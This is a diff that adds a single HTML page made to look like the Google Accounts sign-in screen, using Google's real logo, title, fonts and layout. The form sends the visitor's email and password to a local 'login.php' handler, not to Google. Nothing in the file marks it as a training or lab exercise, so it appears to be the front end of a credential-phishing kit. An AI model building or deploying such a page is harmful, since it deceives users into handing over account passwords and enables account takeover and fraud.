@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            color: #202124;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .google-logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 12px;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        form {
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 24px;
+            width: 100%;
+        }
+        .form-input {
+            position: relative;
+            width: 100%;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            color: #202124;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            margin-bottom: 26px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .next-btn:hover {
+            background-color: #1765cc;
+        }
+        .footer {
+            margin-top: 40px;
+            color: #5f6368;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            width: 450px;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-right: 24px;
+        }
+        .footer-links a:last-child {
+            margin-right: 0;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        
+        <form action="login.php" method="post">
+            <div class="form-group">
+                <div class="form-input">
+                    <input type="email" id="email" name="username" placeholder="Email or phone" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="form-input">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+            </div>
+            
+            <div class="links">
+                <a href="#">Forgot email?</a>
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="button-container">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <div class="lang-selector">English (United States)</div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
